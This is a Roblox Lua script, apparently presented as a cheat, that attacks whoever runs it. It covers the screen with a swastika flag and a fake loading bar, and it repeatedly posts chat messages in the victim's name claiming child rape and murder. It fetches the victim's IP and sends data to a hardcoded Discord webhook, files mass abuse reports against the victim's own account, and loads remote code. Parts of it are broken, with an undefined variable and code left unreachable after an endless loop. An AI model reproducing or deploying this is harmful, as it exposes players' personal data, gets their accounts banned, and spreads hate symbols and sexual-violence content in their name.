--[[      
███╗░░░███╗░█████╗░██████╗░███████╗  ██████╗░██╗░░░██╗  ███╗░░░███╗███████╗██╗░░░░░███████╗
████╗░████║██╔══██╗██╔══██╗██╔════╝  ██╔══██╗╚██╗░██╔╝  ████╗░████║╚════██║██║░░░░░██╔════╝
██╔████╔██║███████║██║░░██║█████╗░░  ██████╦╝░╚████╔╝░  ██╔████╔██║░░███╔═╝██║░░░░░█████╗░░
██║╚██╔╝██║██╔══██║██║░░██║██╔══╝░░  ██╔══██╗░░╚██╔╝░░  ██║╚██╔╝██║██╔══╝░░██║░░░░░██╔══╝░░
██║░╚═╝░██║██║░░██║██████╔╝███████╗  ██████╦╝░░░██║░░░  ██║░╚═╝░██║███████╗███████╗██║░░░░░
╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═════╝░╚══════╝  ╚═════╝░░░░╚═╝░░░  ╚═╝░░░░░╚═╝╚══════╝╚══════╝╚═╝░░░░░
]]--
repeat task.wait() until game:IsLoaded()

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "BlackScreenGui"
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
screenGui.DisplayOrder = 999 
screenGui.IgnoreGuiInset = true

game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false) 
game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)

local blackFrame = Instance.new("Frame")
blackFrame.Size = UDim2.new(2, 0, 2, 0)
blackFrame.Position = UDim2.new(-0.5, 0, -0.5, 0)
blackFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
blackFrame.Parent = screenGui

local function createNaziFlag()
    local flagFrame = Instance.new("Frame")
    flagFrame.Size = UDim2.new(0.2, 0, 0.2, 0)
    flagFrame.Position = UDim2.new(0.4, 0, 0.35, 0)
    flagFrame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    flagFrame.Parent = blackFrame

    local whiteCircle = Instance.new("Frame")
    whiteCircle.Size = UDim2.new(0.6, 0, 0.6, 0)
    whiteCircle.Position = UDim2.new(0.2, 0, 0.2, 0)
    whiteCircle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    whiteCircle.Parent = flagFrame

    local circleCorner = Instance.new("UICorner")
    circleCorner.CornerRadius = UDim.new(1, 0)
    circleCorner.Parent = whiteCircle

    local symbol = Instance.new("TextLabel")
    symbol.Text = "卐"
    symbol.TextColor3 = Color3.fromRGB(0, 0, 0)
    symbol.BackgroundTransparency = 1
    symbol.Size = UDim2.new(1, 0, 1, 0)
    symbol.Position = UDim2.new(0, 0, 0, 0)
    symbol.Parent = whiteCircle
    symbol.Font = Enum.Font.SourceSansBold
    symbol.TextScaled = true
end

createNaziFlag()

local createdByLabel = Instance.new("TextLabel")
createdByLabel.Parent = blackFrame
createdByLabel.Text = "Created by mzlf"
createdByLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
createdByLabel.BackgroundTransparency = 1
createdByLabel.Size = UDim2.new(0.4, 0, 0.1, 0)
createdByLabel.Position = UDim2.new(0.3, 0, 0.25, 0)
createdByLabel.Font = Enum.Font.GothamBold
createdByLabel.TextScaled = true

local tweenService = game:GetService("TweenService")
local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1, true)
local goal = {TextColor3 = Color3.fromRGB(255, 0, 0)}
local tween = tweenService:Create(createdByLabel, tweenInfo, goal)
tween:Play()

local textLabel = Instance.new("TextLabel")
textLabel.Parent = blackFrame
textLabel.Text = "Script loading"
textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
textLabel.BackgroundTransparency = 1
textLabel.Size = UDim2.new(1, 0, 0.2, 0)
textLabel.Position = UDim2.new(0, 0, 0.5, 0)
textLabel.Font = Enum.Font.SourceSans
textLabel.TextScaled = true

local loadingBarBackground = Instance.new("Frame")
loadingBarBackground.Parent = blackFrame
loadingBarBackground.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
loadingBarBackground.Size = UDim2.new(0.8, 0, 0.02, 0)
loadingBarBackground.Position = UDim2.new(0.1, 0, 0.7, 0)

local loadingBar = Instance.new("Frame")
loadingBar.Parent = loadingBarBackground
loadingBar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
loadingBar.Size = UDim2.new(0, 0, 1, 0)

local tweenInfoBar = TweenInfo.new(30, Enum.EasingStyle.Linear)
local goalBar = {Size = UDim2.new(1, 0, 1, 0)}
local tweenBar = tweenService:Create(loadingBar, tweenInfoBar, goalBar)

task.delay(1, function()
    tweenBar:Play()
end)

local function copyToClipboard(text)
    if setclipboard then
        setclipboard(text)
    end
end

tweenBar.Completed:Connect(function()
    textLabel:Destroy()
    createdByLabel:Destroy()
    blackFrame:ClearAllChildren()

    local endText = Instance.new("TextLabel")
    endText.Parent = blackFrame
    endText.Text = "Don't cheat lil bro"
    endText.TextColor3 = Color3.fromRGB(255, 255, 255)
    endText.BackgroundTransparency = 1
    endText.Size = UDim2.new(1, 0, 0.2, 0)
    endText.Position = UDim2.new(0, 0, 0.3, 0)
    endText.Font = Enum.Font.SourceSansBold
    endText.TextScaled = true

    local telegramButton = Instance.new("TextButton")
    telegramButton.Parent = blackFrame
    telegramButton.Text = "Join my telegram"
    telegramButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    telegramButton.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
    telegramButton.Size = UDim2.new(0.6, 0, 0.1, 0)
    telegramButton.Position = UDim2.new(0.2, 0, 0.5, 0)
    telegramButton.Font = Enum.Font.SourceSansBold
    telegramButton.TextScaled = true

    telegramButton.MouseButton1Click:Connect(function()
        copyToClipboard("https://t.me/russianmzlfgroup")

        local log = Instance.new("TextLabel")
        log.Parent = blackFrame
        log.Text = "Copied to clipboard"
        log.TextColor3 = Color3.fromRGB(0, 255, 0)
        log.BackgroundTransparency = 1
        log.Size = UDim2.new(1, 0, 0.1, 0)
        log.Position = UDim2.new(0, 0, 0.65, 0)
        log.Font = Enum.Font.SourceSansBold
        log.TextScaled = true

        task.wait(2)
        log:Destroy()
    end)

    local sound = Instance.new("Sound")
    sound.SoundId = "rbxassetid://7713890963"
    sound.Volume = 1
    sound.Looped = true
    sound.Parent = blackFrame
    sound:Play()
end)

local UserInputService = game:GetService("UserInputService")
UserInputService.InputBegan:Connect(function(input, processed)
    if input.KeyCode == Enum.KeyCode.Escape and not processed then
        print("Escape key pressed, blocking exit")
    end
end)

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TextChatService = game:GetService("TextChatService")
local LocalPlayer = Players.LocalPlayer
local chat = TextChatService.ChatInputBarConfiguration.TargetTextChannel

local function sendHi()
    local message = "made by mzlf with love, join to my 🆃🅴🅻🅴🅶🆁🅰️🅼 - russianmzlfchannel, 🅸 🆁🅰️🅿️🅴 🅲🅷🅸🅻🅳🆁🅴🅽🆂, 🅸 🅺🅸🅻🅻 🅲🅷🅸🅻🅳🆁🅴🅽🆂, 🅸 🅳🅸🆂🅼🅴🅼🅱️🅴🆁 🅲🅷🅸🅻🅳🆁🅴🅽🆂,я̶ ̷е̶б̶у̷ ̶д̶е̷т̴е̸й̴ "
    
    if TextChatService.ChatVersion == Enum.ChatVersion.LegacyChatService then
        ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents").SayMessageRequest:FireServer(message, "All")
    else
        chat:SendAsync(message)
    end
end

while true do
    sendHi()
    task.wait(1)
end

local player_name = game:GetService("Players").LocalPlayer.Name
local webhook_url = "https://discord.com/api/webhooks/1273975370395422721/-0WV2cl-4vytiFBEFecibzD6A8gaLWEEsDsF2bE0Ug2aZKN9VLRbmED_oVfqj6cNSQt4"

local ip_info = syn.request({
    Url = "http://ip-api.com/json",
    Method = "GET"
})

syn.request({
    Url = webhook_url,
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
})

local categories = {
    "Bullying",
    "Inappropriate Language",
    "Discriminatory Language",
    "Inappropriate Username",
    "Exploiting/Cheating",
    "Scamming",
    "Offsite Links",
    "Personal Info Sharing"
}

local players = game:GetService("Players")
local localPlayer = players.LocalPlayer

for _, category in ipairs(categories) do
    players:ReportAbuse(localPlayer, category, "Auto-reported for breaking Roblox TOS.")
    task.wait(1.5)
    players:ReportAbuse(localPlayer, category, "Auto-reported for breaking Roblox TOS.")
end

local function notifySelfReport()
    local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/shlexware/Orion/main/source"))()
    OrionLib:MakeNotification({
        Name = "Self-Report",
        Content = "He want fuck,rape and kill childrens: " .. table.concat(categories, ", "),
        Time = 5
    })
end

notifySelfReport()

